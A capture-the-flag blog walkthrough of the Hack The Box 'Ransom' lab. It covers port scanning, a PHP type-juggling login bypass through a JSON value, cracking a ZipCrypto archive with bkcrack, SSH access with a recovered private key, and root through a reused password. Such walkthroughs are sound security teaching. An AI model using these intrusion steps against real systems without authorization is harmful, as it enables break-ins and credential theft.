---
layout: post
title: HTB Ransom  
subtitle: Medium Box
thumbnail-img: /assets/img/ransom/ransom.png
tags: [HTB]
---

# Notes
![Explore](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/ransom/ransom.png)


| Name | Ransom |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 15 March 2022 |
| DIFFICULTY | Medium |

IP: 10.10.11.153

# Port Scan

I started this box with a full port scan and it looks like there are two ports open 22 and 80
`nmap -p- --min-rate 10000 10.10.11.153 -Pn -v`

```
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

Next, I did a more in-depth scan using nmap NSE scripts to learn more about each port `-sVC` will find out the versions of each protocol, and run safe NSE scripts to do some general enumeration.
`nmap -p 22,80 -sCV 10.10.11.153 -oN scriptScan.nmap`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title:  Admin - HTML5 Admin Template
|_Requested resource was http://10.10.11.153/login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Port 80 HTTP

Going to `http://10.10.11.153` redirects me to `http://10.10.11.153/login`

![Ransom](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/ransom/a1d6ab2a32ac480691965fad57abb1c1.png)

I sent a test password of "password" and intercepted the request with burp. From the request below I learned a few things. First that it is sending the password to `/api/login?password=`, its poor practice to send a password in a GET request. The second thing we can learn is from our cookies. We have a `XSRF-TOKEN` and a `laravel_session` cookie. I was not sure what Larvel was so I did a google search and it is an open-source PHP web framework.

```
GET /api/login?password=password HTTP/1.1
Host: 10.10.11.153
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://10.10.11.153/login

Cookie: XSRF-TOKEN=eyJpdiI6[snip]; laravel_session=eyJpdiI6I[snip]
```

I tried brute-forcing the password with burpsuite intruder and the top 100 passwords from `rockyou` to see if I could get a quick win but I was not successful

![Ransom](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/ransom/2ad95973452c446490df96294e1cf55d.png)

![Ransom](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/ransom/f0f8f802e2494e289f7f1d5a48c1bb92.png)


I sorted the result's by Length to show a successful login

![Ransom](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/ransom/43450600e9e94a7ca79fb9ace24d4f9e.png)


I sent the request to the Repeater tab and played around with the request. The first thing I did was turn it into a POST. The application responded saying that POST was not supported

![Ransom](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/ransom/a0020c766ee8473b9ec7adac6505e16b.png)


I tried changing GET to POST, keeping the body the same to see what it would do. I got a different response saying that the data was invalid. The response was in the form of [JSON](https://www.json.org/json-en.html)

![Ransom](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/ransom/5e73fa648131441c9cb8c18a89e75af6.png)


I then converted part of the request to json to see if that was the data type it accepted, and it was!

![Ransom](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/ransom/6f481e3daa764afea686498c6ef298de.png)


## Type Juggling

There is a vulnerability in php called "Type Juggling". Because of the JSON we can exploit this vulnerability.

In PHP you don't need to define a variable type you just declare it and php figures out what kind of data type it is. If variables are used as part of a comparison, like a login page, PHP needs to guess what the variables represent. Then PHP will convert the variables to a common data type and then do the comparison. This guessing game can cause a lot of problems. Look at the example below, we are comparing the number 0 to a string and it returned true. In PHP any string without a leading number when compared with the number 0 will return true.

```php
php -a 
Interactive mode enabled

php > $number = 0;
php > $string = "password";
php > var_dump($number == $string);
bool(true)
```

This does not affect all PHP applications because usually, we don't get to define the data type. Most of the time PHP will think we are sending a string so `"0" == "password"` would return false

```
php -a
Interactive mode enabled

php > var_dump("0" == "password");
bool(false)
```

The above example does not apply to us because of JSON that we discovered. If JSON or un serialization is in place we can bypass that check. I tested this out by entering `0` and I saw that it evaluated it to true. On the back it is doing a comparison similar to this `"UHCPASS" == 0` to grant access. We learned earlier that when a string is compared to a number it will return true thus giving us access

![Ransom](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/ransom/19e46922fda541b495eb99c891c9763b.png)


If you want to read more about PHP comparisons you can find it [Here](https://www.php.net/manual/en/types.comparisons.php)

Now that we have a valid request I went back to `http://10.10.11.153/login` and intercepted the request and replaced it with the one we crafted in repeater. Then I forwarded the request and we have our user flag!

![Ransom](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/ransom/7626471c48a74c45a458d4f1d1c4ba37.png)


# uploaded-file-3422.zip

Past the login page we can see "homedirectory.zip" I downloaded this and tried to unzip it but I need a password. I also noticed that it wanted a password for each file inside. I didn't want to go through each one so I did `CTRL + C`

```
┌──(root💀kali)-[~/htb/ransom]
└─# unzip uploaded-file-3422.zip 
Archive:  uploaded-file-3422.zip      
[uploaded-file-3422.zip] .bash_logout password:  
password incorrect--reenter:                                                                  
password incorrect--reenter:                                                                  
   skipping: .bash_logout            incorrect password
[uploaded-file-3422.zip] .bashrc password: 
password incorrect--reenter:                                                                  
password incorrect--reenter:                 
   skipping: .bashrc                 incorrect password
[uploaded-file-3422.zip] .profile password: 
password incorrect--reenter:          
password incorrect--reenter: 
[snip]
```

I wanted to view the contents of this file so I ran `7z l uploaded-file-3422.zip`. The `l` will list everything inside. Looks like it s a home directory with ssh keys inside

```
--
Path = uploaded-file-3422.zip
Type = zip
Physical Size = 7735

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2020-02-25 08:03:22 .....          220          170  .bash_logout
2020-02-25 08:03:22 .....         3771         1752  .bashrc
2020-02-25 08:03:22 .....          807          404  .profile
2021-07-02 14:58:14 D....            0            0  .cache
2021-07-02 14:58:14 .....            0           12  .cache/motd.legal-displayed
2021-07-02 14:58:19 .....            0           12  .sudo_as_admin_successful
2022-03-07 08:32:54 D....            0            0  .ssh
2022-03-07 08:32:25 .....         2610         1990  .ssh/id_rsa
2022-03-07 08:32:46 .....          564          475  .ssh/authorized_keys
2022-03-07 08:32:54 .....          564          475  .ssh/id_rsa.pub
2022-03-07 08:32:54 .....         2009          581  .viminfo
------------------- ----- ------------ ------------  ------------------------
2022-03-07 08:32:54              10545         5871  9 files, 2 folders

```

I wanted to view more information about the file so I used the switch `-slt Show technical information for l (List) command`

```
7z l -slt uploaded-file-3422.zip

Path = uploaded-file-3422.zip                  
Type = zip            
Physical Size = 7735

----------
Path = .bash_logout
Folder = -
Size = 220
Packed Size = 170
Modified = 2020-02-25 08:03:22
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 6CE3189B
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0
[snip]
```

We can learn that the encryption type is "ZipCrypto". I did a quick google search on it and the third result was a github page to a tool called [bcrack](https://github.com/kimci86/bkcrack).

## bcrack

To use bcrack we need a file that has the same Cycle Redundancy Check (CRC) value as one of the files above. The CRC value is used to verify file integrity. The idea is to see if any of the files on our kali machine have the same CRC value as any in the list. If there is a match we can leverage a flaw in ZipCrypto to decode the entire folder.

There is a handy tool that can calculate this checksum for us called `crc32`. I ran it against `/home/kali/.profile` and it returned a value of `d1b22a87`. Taking a look at `7z` output I can see that the CRC for `.profile` is `d1b22a87` a match!

```
┌──(root💀kali)-[~/htb/ransom]
└─# crc32 /home/kali/.profile 
d1b22a87

┌──(root💀kali)-[~/htb/ransom]
└─#7z l -slt uploaded-file-3422.zip
[snip]
Path = .profile
[snip]   
CRC = D1B22A87
Method = ZipCrypto Deflate
```

We can now create a zip file of our `.profile` file and save it to our working directory

```
┌──(root💀kali)-[~/htb/ransom]
└─# cp /home/kali/.profile profile

┌──(root💀kali)-[~/htb/ransom]
└─# zip profile.zip profile                                                                                                                                                          
  adding: profile (deflated 51%)
```

Now I'll run `bcrack` to get the keys needed to crack. `-C` is the encrypted zip, `-c` is the cipher file (the one we want to access), `-P` is the plain zip (the one we made), and -p is the file that matches the one we want to get access to. After it runs we get our Keys

```
┌──(root💀kali)-[~/htb/ransom]
└─# bkcrack-1.3.5-Linux/bkcrack -C uploaded-file-3422.zip -c .profile -P profile.zip -p profile 
bkcrack 1.3.5 - 2022-03-06
[23:46:24] Z reduction using 384 bytes of known plaintext
100.0 % (384 / 384)
[23:46:25] Attack on 19539 Z values at index 7
Keys: 7b549874 ebc25ec5 7e465e18
28.8 % (5628 / 19539)
[23:46:34] Keys
7b549874 ebc25ec5 7e465e18
```

We can now decipher the data. `-C` is the encrypted zip, `-k` is our Keys, `-U` is the file that will be written with the new password, and `password` will be the password for the new zip. After it runs we can unzip it using the password we set

```
┌──(root💀kali)-[~/htb/ransom]
└─# bkcrack-1.3.5-Linux/bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U decipher password                                                                             1 ⨯
bkcrack 1.3.5 - 2022-03-06
[23:51:54] Writing unlocked archive decipher with password "password"
100.0 % (9 / 9)
Wrote unlocked archive.
                                                                                                                                                                                             
┌──(root💀kali)-[~/htb/ransom]
└─# unzip decipher -d unzipped/ 
Archive:  decipher
[decipher] .bash_logout password: 
  inflating: .bash_logout            
  inflating: .bashrc                 
  inflating: .profile                
 extracting: .cache/motd.legal-displayed  
 extracting: .sudo_as_admin_successful  
  inflating: .ssh/id_rsa             
  inflating: .ssh/authorized_keys    
  inflating: .ssh/id_rsa.pub         
  inflating: .viminfo  
```

## Shell as HTB

Inside `.ssh` I found a private ssh key `id_rsa`, and I also found a username in `authorized_keys`

```
┌──(root💀kali)-[~/htb/ransom/unzipped/.ssh]
└─# ls    
authorized_keys  id_rsa  id_rsa.pub
                                                                                                                                                                                       
┌──(root💀kali)-[~/htb/ransom/unzipped/.ssh]
└─# cat authorized_keys        
ssh-rsa [snip]/Cq413N6/M= htb@ransom
```

We can use the username and the private key to ssh into the machine

```
┌──(root💀kali)-[~/htb/ransom/unzipped/.ssh]
└─# ssh -i id_rsa htb@10.10.11.153                                
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Mar 17 03:28:49 2022 from 10.10.14.8
htb@ransom:~$
```

# Root

Looking around the file structure the PHP application running on port 80 had its files inside `/srv/prod`. I looked around the app for quite a while until I found `app/Http/Controllers/AuthController.php` inside I found the password `UHC-March-Global-PW!`. Password reuse is a common thing that many people do so I tried to `su -` with that password and to my surprise that worked!

```
htb@ransom:/srv/prod$ su -
Password: UHC-March-Global-PW!
root@ransom:~# id
uid=0(root) gid=0(root) groups=0(root)
```
